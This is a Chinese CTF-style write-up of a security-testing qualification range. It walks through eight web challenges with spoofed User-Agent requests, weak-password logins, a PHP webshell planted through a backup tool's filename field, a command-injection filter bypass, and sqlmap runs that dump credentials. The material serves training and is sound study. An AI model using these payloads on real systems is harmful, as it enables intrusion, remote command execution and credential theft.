本文涉及靶场知识点实操练习——[实验:SQL注入原理与实践(合天网安实验室)](https://www.hetianlab.com/expc.do?ec=ECIDee9320adea6e062017112114390500001&pk_campaign=freebuf-wemedia)

## 前言

最近没什么事，于是报名了某众测，填了资料主办方给了个靶场要考核，这里分享一下靶场考核中的解题过程，一共十道题目，难度也不算太难，但也有一些题没做出来，最后也是顺利的通过了考核。![1605668530_5fb48eb2f09792b367975.png!small](https://image.3001.net/images/20201118/1605668530_5fb48eb2f09792b367975.png!small)

## 前戏

首先考核要答一些选择题和判断题，没什么好说的，主办方要求连了vpn没法上外网，但是都是一些基础的网络安全问题，随便答答就过了，接下来就是靶场的题目了。

## 靶场题目

第一题

WeSec微信公众号

提示：用IPAD手机的2G网络上网

很明显改改UA头就行了，直接搜一下UA头，替换上去。![1605668546_5fb48ec2a3564c2d4b33b.png!small](https://image.3001.net/images/20201118/1605668546_5fb48ec2a3564c2d4b33b.png!small)

改UA头

    
    
    GET /mp_weixin_qq_com.php HTTP/1.1 Host: 119.3.225.8:41064 User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 13_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/7.0.10(0x17000a21) NetType/2G Language/zh_CN Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Connection: close Referer: http://119.3.225.8:41064/index.html Upgrade-Insecure-Requests: 1

返回

    
    
    mozhe64d25d173bdbae7366b76e0798a

第二题

易学车智能考试系统

扫目录发现/admin

爆破弱口令admin和admin888登录后台，发现后台是一个保存文件的功能，这里可以直接读取备份文件bak_wwwroot.zip的源码，关键代码如下：

    
    
    <input name="todir"type="text"id="todir"value="__bak__"class="xxp">(留空为本目录)<br>文件保存名称:<input name="zipname"type="text"id="zipname"value="bak_wwwroot.zip"class="xxp">(.zip)<br><br><input name="password"type="hidden"id="password"value="<?php echo $_POST['password'];?>"><input name="myaction"type="hidden"id="myaction"value="dozip"><input type="submit"name="Submit"class="sub"value=" 开始备份">functioncreatefile(){$endstr="\x50\x4b\x05\x06\x00\x00\x00\x00".pack('v',$this->file_count).pack('v',$this->file_count).pack('V',$this->dirstr_len).pack('V',$this->datastr_len)."\x00\x00";fwrite($this->fp,$this->dirstr.$endstr);fclose($this->fp);}}if(is_array($_REQUEST[dfile])){$faisunZIP=newPHPzip;if($faisunZIP->startfile("$_REQUEST[todir]$_REQUEST[zipname]")){echo"正在添加备份文件...<br><br>";$filenum=0;foreach($_REQUEST[dfile]as$file){if(is_file($file)){echo"文件: $file<br>";}else{echo"目录: $file<br>";}$filenum+=listfiles($file);}$faisunZIP->createfile();echo"<br>备份完成,共添加 $filenum个文件.<br><a href='$_REQUEST[todir]$_REQUEST[zipname]'>$_REQUEST[todir]$_REQUEST[zipname](".num_bitunit(filesize("$_REQUEST[todir]$_REQUEST[zipname]")).")</a>";}else{echo"$_REQUEST[todir]$_REQUEST[zipname]不能写入,请检查路径或权限是否正确.<br>";}}else{echo"没有选择的文件或目录.<br>";}endif;?>

审计代码，这里的dfile参数任何的过滤，尝试修改一下dfile的值，惊喜的发现可以读取任意文件，并写入bak_wwwroot.zip，下载bak_wwwroot.zip就可以读取了。

    
    
    dfile[]=/var/www/html/index.php&todir=__bak__&zipname=bak_wwwroot.zip&password=admin888&myaction=dozip&Submit=+%E5%BC%80%E5%A7%8B%E5%A4%87%E4%BB%BD

虽然知道可以读取任意文件，但是不知道key是放在哪个地方，于是这里又卡了一下，但是转头一想，这里是写一个文件名并压缩进文件里面，老CTFer都知道做msic的时候，文件名会写入压缩包里面，于是写一个一句话木马，并把bak_wwwroot.zip改为bak_wwwroot.php试一下，没想到成功了。

    
    
    dfile[]=/<?php system($_GET[cmd])?>&todir=__bak__&zipname=bak_wwwroot.php&password=admin888&myaction=dozip&Submit=+%E5%BC%80%E5%A7%8B%E5%A4%87%E4%BB%BD

![1605668566_5fb48ed6de4e4fa7b22b1.png!small](https://image.3001.net/images/20201118/1605668566_5fb48ed6de4e4fa7b22b1.png!small)

读取目录下所有文件目录

    
    
    http://119.3.187.27:41154/admin_site_bak2088/__bak__/bak_wwwroot.php?cmd=ls%20../

读取key

    
    
    http://119.3.187.27:41169/admin_K29ke8/__bak__/bak_wwwroot.php?cmd=cat%20/key_ss32ce5ew1v.txt

第三题

数字校园

提示：浏览器类型要是IPAD，以及要用英文，分辨率要1024*768

和第一题一样的套路

不过这里要改下

  * Accept-Language为en,zh;q=0.8,en-us;q=0.5,en;q=0.3

  * Cookie为screenX=1024; screenY=768![1605668578_5fb48ee25763a72ec7612.png!small](https://image.3001.net/images/20201118/1605668578_5fb48ee25763a72ec7612.png!small)

第四题

网站文件备份服务器

虽然页面和第二题不同，但是扫目录同样扫出了是一样的后台，爆破弱口令，然后发现admin和admin，剩下的就和之前的步骤是一样的了，写一个马然后读key。

    
    
    dfile%5B%5D=/<?php system($_GET[cmd])?>&todir=__bak__&zipname=bak_wwwroot.php&password=admin888&myaction=dozip&Submit=+%E5%BC%80%E5%A7%8B%E5%A4%87%E4%BB%BD

第五题

教学器械采购平台

一道命令执行的题，有个输入框

随便fuzz一下，发现过滤了&&和空格

于是&&用%26%26替代绕过，空格用<替代绕过

先用ls读取文件目录

    
    
    iipp=127.0.0.1%26%26ls&submit=Ping

然后再读取key即可![1605668591_5fb48eefb52ba8758fa12.png!small](https://image.3001.net/images/20201118/1605668591_5fb48eefb52ba8758fa12.png!small)

第六题

教学质量评价系统

发现有个注入点

    
    
    http://119.3.177.25:41204/show.php?id=MQ0=

测试了一下发现是base64盲注，用tamper指定base64编码，直接丢sqlmap里面跑一下。

这里要注意的是这个靶场不太稳定，我们用sqlmap有个小问题就是盲注的时候他会根据响应速度来调整发送包的速度，太快了可能网站会崩，所以sqlmap会增加延迟，让他更像是人手工在注入，我觉得慢就断开了，但是如果不清理缓存每次重来就是从上一次继续，所以这里的话加上fresh-queries，再加上batch自动确认。

跑数据库

    
    
    python3 sqlmap.py -u http://119.3.177.25:41204/show.php?id=1* --tamper base64encode.py --dbs --dump --batch --fresh-queries

跑表名

    
    
    python3 sqlmap.py -u http://119.3.177.25:41204/show.php?id=1* --tamper base64encode.py --tables -D test --dump --batch --fresh-queries

跑列名

    
    
    python3 sqlmap.py -u http://119.3.177.25:41204/show.php?id=1* --tamper base64encode.py --columns -D test -T data --dump --batch --fresh-queries

最后payload如下

    
    
    python3 sqlmap.py -u http://119.3.177.25:41204/show.php?id=1* --tamper base64encode.py -D test -T data -C thekey --dump --batch --fresh-queries

直接跑出key![1605668602_5fb48efa3948239b0900c.png!small](https://image.3001.net/images/20201118/1605668602_5fb48efa3948239b0900c.png!small)

第七题

XWAY科技管理系统

平台停机维护的通知存在注入，发现注入点在

    
    
    http://119.3.225.8:41046/new_list.php?id=1

继续sqlmap跑起来，

跑数据库

    
    
    python3 sqlmap.py -u http://119.3.225.8:41046/new_list.php?id=1 --dbs --dump --batch

跑表名

    
    
    python3 sqlmap.py -u http://119.3.225.8:41046/new_list.php?id=1 --tables -T member --dump --batch

跑列名

    
    
    python3 sqlmap.py -u http://119.3.225.8:41046/new_list.php?id=1 --columns -T member -D stormgroup --dump --batch

最后payload

    
    
    python3 sqlmap.py -u http://119.3.225.8:41046/new_list.php?id=1 -D stormgroup -T member -C name,password --dump --batch

跑出两个账号密码

  * mozhe/528469

  * mozhe/888054

登录之后，即可拿到key。

第八题

XWAY电脑采购系统

随便看了发现到一个注入点

    
    
    http://119.3.187.27:41144/new_list.php?id=1

发现是union注入，依旧尝试用sqlmap

跑数据库

    
    
    python3 sqlmap.py -u http://119.3.187.27:41144/new_list.php?id=1 --dbs --dump --batch

跑表名

    
    
    python3 sqlmap.py -u http://119.3.187.27:41144/new_list.php?id=1 --tables -D min_ju4t_mel1i --dump --batch

跑列名

    
    
    python3 sqlmap.py -u http://119.3.187.27:41144/new_list.php?id=1 --columns -D min_ju4t_mel1i -T (@dmin9_td4b} --dump --batch

最后payload

    
    
    python3 sqlmap.py -u http://119.3.187.27:41144/new_list.php?id=1 -D min_ju4t_mel1i -T (@dmin9_td4b} -C username,password --dump --batch

最后跑出五个账号密码，只有一个能用，md5解密登录拿key。

sql注入不愧是OWASP TOP 10 之 榜首，10道题目出现了3道，有一说一sqlmap真的是好用。

本文首发于“合天网安实验室” 作者：kawhi

